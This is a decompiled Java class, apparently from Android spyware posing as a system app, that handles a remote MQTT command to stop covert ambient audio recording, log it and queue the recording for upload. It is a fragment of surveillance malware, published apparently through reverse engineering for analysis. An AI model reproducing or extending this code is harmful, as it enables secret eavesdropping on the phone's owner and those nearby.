package com.app.system.common.commands;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.android.system.RecordCallService;
import com.app.system.common.entity.PlannedRec;
import com.app.system.common.h.m;
import com.app.system.common.service.EventsAndReceiveService;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;
import com.b.a.a.a;

public class StopAudioRec
  extends Command
{
  public static final String CMD_NAME = "STOP_AUDIO_REC";
  public static Command.Factory sFactory = new Command.Factory()
  {
    public Command a(MqttCommand paramAnonymousMqttCommand)
    {
      return new StopAudioRec(paramAnonymousMqttCommand, null);
    }
  };
  
  private StopAudioRec(MqttCommand paramMqttCommand)
  {
    super(paramMqttCommand);
  }
  
  public static void a(Context paramContext, PlannedRec paramPlannedRec)
  {
    long l = StartAudioRec.a();
    int i;
    if (l > 0L) {
      i = (int)(System.currentTimeMillis() / 1000L - l);
    } else {
      i = 0;
    }
    m localm = new m(paramContext);
    if (paramPlannedRec != null)
    {
      paramPlannedRec.realStart = l;
      paramPlannedRec.realDur = i;
      paramPlannedRec.status = 2;
      paramPlannedRec.synchronised = false;
      if (paramPlannedRec.slice == 1) {
        localm.b(paramPlannedRec);
      } else {
        localm.a(paramPlannedRec);
      }
    }
    else
    {
      localm.a(new PlannedRec(l, i, 2));
    }
    paramPlannedRec = new Intent(paramContext, EventsAndReceiveService.class);
    paramPlannedRec.putExtra("event_core_app", "event_send_amb_rec");
    a.a(paramContext, paramPlannedRec);
    StartAudioRec.b();
  }
  
  public static void a(Context paramContext, boolean paramBoolean)
  {
    Intent localIntent = new Intent(paramContext, RecordCallService.class);
    localIntent.putExtra("data", "0");
    long l = StartAudioRec.a();
    if (l > 0L) {
      localIntent.putExtra("call_time", l);
    }
    localIntent.putExtra("call_number", "2_AMBIENT");
    localIntent.putExtra("call_app", "A");
    localIntent.putExtra("abort_rec", paramBoolean);
    paramContext.startService(localIntent);
  }
  
  public static void b(Context paramContext)
  {
    a(paramContext, false);
  }
  
  public MqttCommandReply a(Context paramContext)
  {
    MqttCommandReply localMqttCommandReply = this.mqttCmd.b(paramContext);
    SharedPreferences.Editor localEditor = paramContext.getSharedPreferences("pref", 0).edit();
    localEditor.putLong("amb-rec-stop", 0L);
    localEditor.commit();
    if (!RecordCallService.b())
    {
      localMqttCommandReply.result = 314;
      localMqttCommandReply.replyText = MqttCommandReply.a(localMqttCommandReply.result);
      return localMqttCommandReply;
    }
    a(paramContext, true);
    a(paramContext, null);
    localMqttCommandReply.replyText = "Registrazione terminata";
    return localMqttCommandReply;
  }
}


/* Location:              ~/com/app/system/common/commands/StopAudioRec.class
 *
 * Reversed by:           J
 */